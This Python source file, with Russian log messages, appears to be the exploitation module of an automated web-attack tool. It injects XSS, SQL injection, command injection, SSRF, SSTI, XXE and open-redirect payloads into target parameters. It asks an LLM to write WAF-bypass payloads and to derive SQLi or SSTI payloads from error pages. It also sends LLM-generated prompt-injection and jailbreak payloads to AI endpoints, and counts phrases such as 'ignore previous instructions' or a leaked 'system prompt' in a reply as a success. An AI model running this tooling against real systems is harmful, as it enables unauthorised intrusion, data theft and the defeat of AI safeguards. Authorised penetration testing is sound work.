import json
import logging
import time
from typing import Dict, Optional, Tuple
from urllib3 import disable_warnings  # pip install urllib3 если нет
disable_warnings()
import requests
import urllib.parse
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from html.parser import HTMLParser

from services.llm_service import LLMService
from services.websocket_service import manager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

urlquote = urllib.parse.quote

class XSSValidator(HTMLParser):
    def __init__(self, payload):
        super().__init__()
        self.payload_lower = payload.lower()
        self.is_vulnerable = False

    def handle_starttag(self, tag, attrs):
        # We check if a dangerous tag was injected (script, iframe, object, embed, svg)
        if tag in ['script', 'iframe', 'object', 'embed', 'svg'] and tag in self.payload_lower:
            self.is_vulnerable = True

        # We also check if a dangerous attribute like onerror=, onload=, href=javascript:... was injected
        for attr_name, attr_value in attrs:
            if attr_name.startswith('on') and attr_name in self.payload_lower:
                self.is_vulnerable = True
            elif attr_name in ['href', 'src', 'action'] and attr_value and 'javascript:' in attr_value.lower() and 'javascript:' in self.payload_lower:
                self.is_vulnerable = True

class ExploiterService:
    VULN_TYPE_ALIASES = {
        "Cross Site Scripting (Reflected)": "XSS",
        "Cross Site Scripting (Persistent)": "XSS",
        "Cross Site Scripting (DOM Based)": "XSS",
        "Cross Site Scripting": "XSS",
        "SQL Injection - SQLite": "SQL Injection",
        "SQL Injection - MySQL": "SQL Injection",
        "SQL Injection - PostgreSQL": "SQL Injection",
        "SQL Injection - Oracle": "SQL Injection",
        "SQL Injection - MsSQL": "SQL Injection",
        "SQL Injection - Hypersonic SQL": "SQL Injection",
        "Remote OS Command Injection": "Command Injection",
        "Path Traversal": "Path Traversal",
        "Server Side Request Forgery": "SSRF",
        "XML External Entity Attack": "XXE",
        "External Redirect": "Open Redirect",
    }

    def __init__(self):
        self.llm_service = LLMService()

        self.success_indicators = {
            "SQL Injection": [
                "syntax error", "mysql_fetch", "ORA-", "SQL Server", "PostgreSQL",
                "SQLite", "root:x:", "admin", "password", "sleep(", "benchmark("
            ],
            "Command Injection": [
                "uid=", "gid=", "www-data", "root:x:", "daemon", "bin", "bash: ",
                "whoami", "nslookup", "ping", "cat: /etc/passwd"
            ],
            "XSS": ["<script>alert(1)</script>", "onerror=alert", "onload=alert"],
            "Path Traversal": ["root:x:", "/bin/bash", "www-data", "[system]", "[passwd]"],
            "SSRF": ["metadata", "role", "ami-id", "404", "Connection refused"],
            "SSTI": ["49", "343", "config", "lipsum", "debug", "class"],
            "XXE": ["root:x:", "www-data", "<!DOCTYPE", "[entities]"],
            "Open Redirect": []  # проверяем только редирект на внешний домен
        }
    @staticmethod
    def inject_payload(url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = payload

        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def try_exploit(
        self,
        vuln_type: str,
        url: str,
        method: str,
        param: str,
        data: Dict = None,
        headers: Dict = None,
        cookies: Dict = None,
        ws_id: str = None
    ) -> Tuple[bool, str, Optional[str]]:

        # Strip URL fragment — it's browser-only and not sent in HTTP requests
        url = url.split("#")[0]

        vuln_type = self.VULN_TYPE_ALIASES.get(vuln_type, vuln_type)

        headers = headers or {}
        cookies = cookies or {}
        data = data or {}

        # For display purposes, clean up the original URL so the payload doesn't look messy
        parsed_display = urlparse(url)
        qs_display = parse_qs(parsed_display.query)
        # If the parameter exists, remove its value for the log display to keep it clean
        if param in qs_display:
            qs_display[param] = ['']
        cleaned_query = urlencode(qs_display, doseq=True)
        display_url = urlunparse(parsed_display._replace(query=cleaned_query))

        msg1 = f"[*] Начинаем автоматическую эксплуатацию: {vuln_type} в {display_url}"
        msg2 = f"[*] Начинаем автоматическую эксплуатацию (сookies): {cookies}"
        logger.info(msg1)
        logger.info(msg2)
        if ws_id:
            await manager.broadcast(ws_id, {"type": "log", "message": msg1})
            await manager.broadcast(ws_id, {"type": "log", "message": msg2})
            
        payload = data.get("payloads")

        try:
            # Technique: API Parameter Guessing (Mass Assignment / IDOR)
            if vuln_type in ["Mass Assignment", "IDOR"] and "json" in headers.get("Content-Type", "").lower() and data.get("raw"):
                try:
                    original_json = json.loads(data.get("raw", "{}"))
                    mutated_json = await self.llm_service.guess_api_parameters(original_json)
                    data["raw"] = json.dumps(mutated_json)
                    msg = f"[+] LLM сгенерировал мутированный JSON: {data['raw']}"
                    logger.info(msg)
                    if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})
                except Exception as e:
                    logger.warning(f"Ошибка API Parameter Guessing: {e}")

            if method.upper() == "GET":
                # Technique: Context-Aware XSS
                if vuln_type == "XSS" and not payload:
                    test_url = self.inject_payload(url, param, "AWAST_TEST_STRING")
                    resp = requests.get(test_url, headers=headers, cookies=cookies, verify=False, timeout=12)
                    if "AWAST_TEST_STRING" in resp.text:
                        idx = resp.text.find("AWAST_TEST_STRING")
                        context_snippet = resp.text[max(0, idx-150):idx+150]
                        payload = await self.llm_service.generate_context_aware_xss(context_snippet)
                        msg = f"[+] LLM сгенерировал Context-Aware XSS: {payload}"
                        logger.info(msg)
                        if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})

                if not payload: payload = self.payloads.get(vuln_type, [""])[0]

                test_url = self.inject_payload(url, param, payload)
                msg = f"[*] Отправляем в: {test_url}"
                logger.info(msg)
                if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})
                response = requests.get(
                    test_url,
                    headers=headers,
                    cookies=cookies,
                    verify=False,
                    timeout=12,
                    allow_redirects=vuln_type != "Open Redirect"
                )
            else:
                test_data = data.copy()
                if not payload: payload = self.payloads.get(vuln_type, [""])[0]

                # Technique: Prompt Injection / AI Jailbreak
                if vuln_type == "Prompt Injection":
                     payload = await self.llm_service.generate_prompt_injection()
                     msg = f"[+] LLM сгенерировал Prompt Injection: {payload}"
                     logger.info(msg)
                     if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})

                if param in test_data:
                    test_data[param] = payload
                elif "json" in headers.get("Content-Type", "").lower():
                    test_data_parsed = json.loads(test_data.get("raw", "{}"))
                    self._set_nested_param(test_data_parsed, param, payload)
                    test_data = json.dumps(test_data_parsed)
                else:
                    test_data[param] = payload

                response = requests.request(
                    method=method,
                    url=url,
                    data=test_data,
                    headers=headers,
                    cookies=cookies,
                    verify=False,
                    timeout=12
                )

            # Technique: WAF-Bypassing
            if response.status_code in [403, 401, 406]:
                msg = f"[*] Получен {response.status_code}. Пробуем WAF Bypass через LLM."
                logger.info(msg)
                if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})
                payload = await self.llm_service.generate_waf_bypass(vuln_type, payload)
                if method.upper() == "GET":
                     test_url = self.inject_payload(url, param, payload)
                     response = requests.get(test_url, headers=headers, cookies=cookies, verify=False, timeout=12)
                else:
                     if isinstance(test_data, dict) and param in test_data: test_data[param] = payload
                     elif "json" in headers.get("Content-Type", "").lower():
                         test_data_parsed = json.loads(data.get("raw", "{}"))
                         self._set_nested_param(test_data_parsed, param, payload)
                         test_data = json.dumps(test_data_parsed)
                     else: test_data = {param: payload}
                     response = requests.request(method=method, url=url, data=test_data, headers=headers, cookies=cookies, verify=False, timeout=12)

            content = response.text.lower()

            # Technique: Error-Based Analysis
            if response.status_code >= 500:
                msg = f"[*] Получен 500 Error. Анализируем через LLM."
                logger.info(msg)
                if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg})
                if vuln_type == "SSTI":
                    payload = await self.llm_service.analyze_ssti_error(response.text)
                    msg2 = f"[+] LLM сгенерировал SSTI payload: {payload}"
                    logger.info(msg2)
                    if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg2})
                elif "sql" in vuln_type.lower() or "injection" in vuln_type.lower():
                    payload = await self.llm_service.analyze_sql_error(response.text)
                    msg3 = f"[+] LLM сгенерировал SQLi payload: {payload}"
                    logger.info(msg3)
                    if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg3})

            if vuln_type == "Open Redirect":
                if response.url and "google.com" in response.url or "evil.com" in response.url:
                    success_msg = f"Редирект на внешний сайт: {response.url}"
                    return True, success_msg, payload

            if vuln_type == "XSS":
                if urllib.parse.quote(payload.lower()) in content or payload.lower() in content:
                    validator = XSSValidator(payload)
                    try:
                        validator.feed(content)
                        if validator.is_vulnerable:
                            return True, "Payload успешно внедрён в HTML контекст (XSS подтверждён).", payload
                        else:
                            msg_not_exec = f"[*] XSS payload '{payload}' отражён, но не исполняется в текущем контексте."
                            logger.info(msg_not_exec)
                            if ws_id: await manager.broadcast(ws_id, {"type": "log", "message": msg_not_exec})
                            # Exit early so it doesn't fall through to success_indicators
                            return False, "Payload отражён, но контекст безопасен.", None
                    except Exception as e:
                        logger.warning(f"Ошибка парсинга HTML при проверке XSS: {e}")
                        
                        
            # Only run fallback indicators if we haven't already explicitly failed an XSS validation
            for indicator in self.success_indicators.get(vuln_type, []):
                if indicator.lower() in content:
                    return True, f"Найден индикатор уязвимости: {indicator}", payload

            # Specific check for Prompt Injection if system leaked instruction keywords
            if vuln_type == "Prompt Injection" and any(k in content for k in ["system prompt", "ignore previous instructions", "you are an ai"]):
                return True, "Обнаружена утечка промпта или выполнение AI Jailbreak.", payload

            time.sleep(0.3)

        except Exception as e:
            logger.warning(f"Ошибка при попытке: {e}")
            return False, "Ошибка", None

        return False, "Автоматическая эксплуатация не удалась. Попробуйте вручную.", None

    @staticmethod
    def _set_nested_param(obj, param_path: str, value):
        keys = param_path.split(".")
        if len(keys) > 1:
            current = obj
            for k in keys[:-1]:
                current = current.setdefault(k, {})
            current[keys[-1]] = value
        else:
            obj[param_path] = value

    @staticmethod
    def _make_curl(url: str, method: str, param: str, payload: str, _: dict, headers: dict, cookies: dict) -> str:
        cmd = ["curl", "-s"]

        for k, v in headers.items():
            cmd.append(f"-H '{k}: {v}'")

        for k, v in cookies.items():
            cmd.append(f"--cookie '{k}={v}'")

        if method.upper() == "POST":
            cmd.append("-X POST")
            if "application/json" in headers.get("Content-Type", ""):
                cmd.append(f"-d '{json.dumps({param: payload})}'")
            else:
                cmd.append(f"-d '{param}={urlquote(payload)}'")
        else:
            final_url = url.replace(f"{{{param}}}", urlquote(payload))
            cmd.append(f'"{final_url}"')

        return " \\ \n    ".join(cmd)